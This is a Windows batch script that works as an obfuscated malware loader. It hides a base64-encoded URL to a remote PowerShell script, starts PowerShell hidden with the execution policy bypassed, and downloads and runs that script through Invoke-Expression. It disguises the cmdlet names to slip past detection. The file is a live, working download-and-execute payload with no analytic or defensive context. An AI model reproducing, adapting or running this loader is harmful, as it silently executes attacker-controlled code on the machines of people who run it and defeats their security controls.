@echo off
setlocal

:: Base64-encoded URL of the PowerShell payload
set "encodedURL=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s1M3h1cG40My9pOTY1NjUyZi9yZWZzL2hlYWRzL21haW4vbS5wczE="

:: Run obfuscated PowerShell command silently
powershell -NoP -W Hidden -Exec Bypass -Command ^
 "$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedURL%'));$i='Invoke-Expression';$w='Invoke-RestMethod';&($i) (&($w) ($u))"

endlocal
